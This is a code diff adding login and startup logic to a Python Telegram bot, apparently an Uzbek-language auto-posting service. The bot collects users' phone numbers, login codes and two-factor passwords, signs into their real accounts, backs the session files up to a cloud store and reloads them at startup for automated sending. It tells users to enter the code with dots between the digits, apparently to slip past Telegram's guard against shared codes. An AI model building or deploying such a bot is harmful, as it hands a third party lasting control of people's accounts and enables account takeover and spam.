@@ -1446,4 +1446,253 @@ async def trigger_immediate_sending(user_id):
     await run_sending_cycle_for_user(user_id)
 
 @router.callback_query(F.data == "add_account")
-async def callback_add_account_wizard(callback_
+async def callback_add_account_wizard(callback_query: types.CallbackQuery, state: FSMContext):
+    try:
+        await callback_query.answer()
+    except Exception:
+        pass
+    
+    user_id = callback_query.from_user.id
+    if user_id in active_clients:
+        try:
+            await active_clients[user_id].disconnect()
+        except Exception:
+            pass
+        active_clients.pop(user_id, None)
+
+    session_file = os.path.join(SESSIONS_DIR, f"session_{user_id}.session")
+    if os.path.exists(session_file):
+        for attempt in range(5):
+            try:
+                os.remove(session_file)
+                break
+            except Exception:
+                await asyncio.sleep(0.3)
+
+    await callback_query.message.answer(
+        "📱 <b>Real Telegram akkaunt ulash</b>\n\n"
+        "Iltimos, telefon raqamingizni xalqaro formatda kiriting (masalan: <code>+998901234567</code>):",
+        parse_mode="HTML"
+    )
+    await state.set_state(LoginStates.waiting_phone)
+
+@router.message(StateFilter(LoginStates.waiting_phone))
+async def state_phone_received(message: types.Message, state: FSMContext):
+    phone = message.text.strip()
+    if not phone.startswith("+") or len(phone) < 9:
+        await message.answer("❌ Noto'g'ri telefon raqam! Format: +998901234567")
+        return
+    
+    await state.update_data(phone=phone)
+    await message.answer("🔄 Telegram serverlariga mutloq toza ulanish o'rnatilmoqda. Iltimos kuting...")
+    
+    try:
+        client = await get_client(message.from_user.id)
+        send_code_result = await client.send_code_request(phone)
+        await state.update_data(phone_code_hash=send_code_result.phone_code_hash)
+        await state.set_state(LoginStates.waiting_code)
+        
+        instructions = (
+            "💬 <b>Sms ulanish kodi yuborildi!</b>\n\n"
+            "⚠️ <b>MUHIM ESLATMA:</b>\n"
+            "Kodni albatta raqamlar orasiga <b>nuqta qo'yib</b> kiriting!\n"
+            "Format: <b>1.2.3.4.5</b>\n\n"
+            "Iltimos, Telegram ilovangizga kelgan 5 xonali kodni yozing:"
+        )
+        await message.answer(instructions, parse_mode="HTML")
+        
+    except Exception as e:
+        await message.answer(f"❌ Ulanishda xatolik yuz berdi: {str(e)}")
+        await state.clear()
+
+@router.message(StateFilter(LoginStates.waiting_code))
+async def state_code_received(message: types.Message, state: FSMContext):
+    code = message.text.strip().replace(".", "").replace(" ", "")
+    data = await state.get_data()
+    phone = data.get("phone")
+    phone_code_hash = data.get("phone_code_hash")
+    
+    try:
+        client = await get_client(message.from_user.id)
+        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+        
+        me = await client.get_me()
+        user_id = message.from_user.id
+        
+        db_users[user_id]["active_phone"] = phone
+        db_users[user_id]["active_name"] = me.first_name
+        db_users[user_id]["active_username"] = f"@{me.username}" if me.username else "@-"
+        save_db()
+        
+        # MUVAFFAQIYATLI LOGIN: Sessiyani bulutga zaxiralash
+        await backup_session_to_cloud(user_id)
+        
+        await message.answer(
+            "<b>Tabriklaymiz! Akkauntingiz muvaffaqiyatli bog'landi va bulutga xavfsiz zaxiralandi.</b>\n\n"
+            "Endi autohabar bo'limiga o'tib, botni faollashtirishingiz mumkin!",
+            reply_markup=get_main_keyboard(user_id),
+            parse_mode="HTML"
+        )
+        await state.clear()
+        
+    except errors.PhoneCodeExpiredError:
+        await message.answer(
+            "❌ <b>Ulanish kodi muddati tugadi!</b>\n\n"
+            "Sessiya zanjiri buzilgan. Iltimos, qaytadan telefon raqamingizni kiritib ulaning.",
+            parse_mode="HTML"
+        )
+        await state.clear()
+        
+    except errors.PhoneCodeInvalidError:
+        await message.answer(
+            "❌ <b>Kiritilgan kod xato!</b>\n\n"
+            "Iltimos, kodni tekshirib qayta kiriting.",
+            parse_mode="HTML"
+        )
+        
+    except errors.SessionPasswordNeededError:
+        await state.set_state(LoginStates.waiting_2fa)
+        await message.answer(
+            "🛡️ <b>Akkauntingizda Ikki bosqichli himoya (2FA) aniqlandi!</b>\n\n"
+            "Iltimos, o'z shaxsiy 2-bosqichli parolingizni kiriting:",
+            parse_mode="HTML"
+        )
+    except Exception as e:
+        await message.answer(f"❌ Xatolik yuz berdi: {str(e)}")
+
+@router.message(StateFilter(LoginStates.waiting_2fa))
+async def state_2fa_received(message: types.Message, state: FSMContext):
+    password = message.text.strip()
+    user_id = message.from_user.id
+    data = await state.get_data()
+    phone = data.get("phone")
+    
+    try:
+        client = await get_client(user_id)
+        await client.sign_in(password=password)
+        me = await client.get_me()
+        
+        db_users[user_id]["active_phone"] = phone
+        db_users[user_id]["active_name"] = me.first_name
+        db_users[user_id]["active_username"] = f"@{me.username}" if me.username else "@-"
+        save_db()
+        
+        # MUVAFFAQIYATLI LOGIN: Sessiyani bulutga zaxiralash
+        await backup_session_to_cloud(user_id)
+        
+        await message.answer(
+            "✅ <b>Akkauntingiz ikki bosqichli parol orqali muvaffaqiyatli bog'landi va bulutga zaxiralandi!</b>",
+            reply_markup=get_main_keyboard(user_id),
+            parse_mode="HTML"
+        )
+        await state.clear()
+    except errors.PasswordHashInvalidError:
+        await message.answer("❌ <b>Ikki bosqichli parol noto'g'ri!</b>\n\nIltimos, parolingizni qayta kiriting.")
+    except Exception as e:
+        await message.answer(f"❌ Parol noto'g'ri: {str(e)}")
+
+
+# ================= SOXTA WEB SERVER (PORT BINDING UCHUN) =================
+
+async def handle_ping(request):
+    return web.Response(text="Bot is running smoothly!")
+
+async def start_web_server():
+    app = web.Application()
+    app.router.add_get('/', handle_ping)
+    app.router.add_get('/ping', handle_ping)
+    
+    port = int(os.environ.get("PORT", 10000))
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
+    logging.info(f"Port {port}-portda muvaffaqiyatli ishga tushirildi!")
+
+# ==================================================================================
+
+
+# Mavjud sessiya fayllarini tekshirish va avtomatik ulanish
+async def init_existing_sessions():
+    for file in os.listdir(SESSIONS_DIR):
+        if file.endswith(".session"):
+            user_id_str = file.replace("session_", "").replace(".session", "")
+            try:
+                user_id = int(user_id_str)
+                client = await get_client(user_id)
+                
+                if await client.is_user_authorized():
+                    active_clients[user_id] = client
+                    me = await client.get_me()
+                    
+                    if user_id not in db_users:
+                        db_users[user_id] = {
+                            "balans": 0,
+                            "stars": 0,
+                            "is_pro": False,
+                            "referrals": 0,
+                            "reklama_matni": "🔥 AutoHabar Pro yordamida ishingizni yengillating!",
+                            "reklama_rasm": None,
+                            "inline_buttons": [],
+                            "interval": 15,
+                            "next_run_timestamp": 0,
+                            "active_phone": f"+{me.phone}",
+                            "active_name": me.first_name,
+                            "active_username": f"@{me.username}" if me.username else "@-",
+                            "is_sending": False,
+                            "groups_choice": "all",
+                            "selected_groups": [],
+                            "cached_groups": [],
+                            "joined_time": datetime.now().strftime("%H:%M"),
+                            "today_sent": 0,
+                            "total_sent": 0,
+                            "channels": ["@autoxabarc_news", "@autoxabar_chat"]
+                        }
+                    else:
+                        db_users[user_id]["active_phone"] = f"+{me.phone}"
+                        db_users[user_id]["active_name"] = me.first_name
+                        db_users[user_id]["active_username"] = f"@{me.username}" if me.username else "@-"
+                        
+                    save_db()
+                    logging.info(f"Mavjud sessiya muvaffaqiyatli yuklandi: +{me.phone} (ID: {user_id})")
+            except Exception as e:
+                logging.error(f"Sessiya yuklashda xatolik ({file}): {e}")
+
+async def main():
+    global bot
+    print("==================================================")
+    print("🤖 AutoHabar Pro Telegram Bot ishga tushmoqda...")
+    print("==================================================")
+    print(f"[Tizim] Bot tokeni: {BOT_TOKEN[:15]}...")
+    print(f"[Tizim] Admin ID: {ADMIN_ID}")
+    
+    # 1. Avval bulutdagi barcha sessiya (.session) fayllarini Renderga tiklab olamiz
+    if db:
+        print("[Sessiya] Bulutdan eski ulanishlarni tiklash boshlandi...")
+        await restore_sessions_from_cloud()
+    
+    # Standart aiohttp sessiya sozlamalari
+    bot = Bot(token=BOT_TOKEN)
+    
+    # Telethon ulanishlari asinxron fon rejimida boshlanadi
+    asyncio.create_task(init_existing_sessions())
+    
+    # Asinxron ishlovchi fon xizmatlarini yoqamiz
+    asyncio.create_task(auto_sender_worker())
+    logging.info("Auto-sender asinxron xizmati muvaffaqiyatli yoqildi!")
+    
+    asyncio.create_task(start_web_server())
+    
+    print("\n✅ BOT MUVAFFAQIYATLI ISHGA TUSHDI!")
+    print("💬 Endi Telegram ilovangizni oching va botingizga kiring.")
+    print("👉 Botingizga /start buyrug'ini yuboring.")
+    print("\n==================================================")
+    
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n[👋] Avtomatlashtirish jarayoni foydalanuvchi tomonidan to'xtatildi.")
+        sys.exit()
